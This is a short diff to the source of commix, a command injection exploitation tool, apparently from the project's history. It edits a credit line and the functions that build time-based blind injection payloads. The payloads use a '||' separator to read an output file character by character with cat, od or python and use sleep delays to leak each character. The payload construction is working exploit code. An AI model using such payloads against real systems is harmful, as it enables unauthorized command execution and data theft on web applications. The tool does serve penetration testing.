@@ -2,7 +2,7 @@
 # encoding: UTF-8
 
 """
- This file is part of commix tool.
+ This file is part of commix (@commixproject) tool.
  Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
  https://github.com/stasinopoulos/commix
 
@@ -220,7 +220,6 @@ def get_char(separator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method):
       
   elif separator == "||" :
     payload = (separator + " "
-	      "echo '" + TAG + "' |"+
 	      "[ \"" + str(ascii_char) + "\" -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
 	      "sleep " + str(delay) + " "
 	      )
@@ -259,7 +258,6 @@ def get_char_alter_shell(separator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_reque
 
   elif separator == "||" :
     payload = (separator + " "
-	      "echo '" + TAG + "' |"+
 	      "[ \"" + str(ascii_char) + "\" -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\") ] " + separator + 
 	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
 	      )
